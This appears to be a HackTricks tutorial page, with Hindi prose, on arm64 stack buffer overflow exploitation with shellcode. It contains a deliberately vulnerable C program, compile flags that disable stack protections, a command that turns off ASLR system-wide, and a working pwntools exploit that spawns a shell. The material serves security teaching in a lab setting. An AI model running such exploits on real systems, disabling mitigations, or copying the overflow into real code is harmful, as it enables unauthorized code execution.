# Stack Shellcode - arm64

{{#include ../../../banners/hacktricks-training.md}}

arm64 का परिचय यहाँ खोजें:

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

## Code&#x20;
```c
#include <stdio.h>
#include <unistd.h>

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
पीआईई, कैनरी और एनएक्स के बिना संकलित करें:
```bash
clang -o bof bof.c -fno-stack-protector -Wno-format-security -no-pie -z execstack
```
## No ASLR & No canary - Stack Overflow&#x20;

ASLR को रोकने के लिए निष्पादित करें:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
[**bof की ऑफसेट प्राप्त करने के लिए इस लिंक की जांच करें**](../ret2win/ret2win-arm64.md#finding-the-offset).

शोषण:
```python
from pwn import *

# Load the binary
binary_name = './bof'
elf = context.binary = ELF(binary_name)

# Generate shellcode
shellcode = asm(shellcraft.sh())

# Start the process
p = process(binary_name)

# Offset to return address
offset = 72

# Address in the stack after the return address
ret_address = p64(0xfffffffff1a0)

# Craft the payload
payload = b'A' * offset + ret_address + shellcode

print("Payload length: "+ str(len(payload)))

# Send the payload
p.send(payload)

# Drop to an interactive session
p.interactive()
```
यहाँ "जटिल" चीज़ केवल स्टैक में कॉल करने के लिए पता ढूंढना होगा। मेरे मामले में, मैंने gdb का उपयोग करके पाए गए पते के साथ एक्सप्लॉइट उत्पन्न किया, लेकिन फिर जब इसे एक्सप्लॉइट किया गया तो यह काम नहीं किया (क्योंकि स्टैक का पता थोड़ा बदल गया था)।

मैंने उत्पन्न **`core` फ़ाइल** खोली (`gdb ./bog ./core`) और शेलकोड की शुरुआत का असली पता चेक किया। 

{{#include ../../../banners/hacktricks-training.md}}
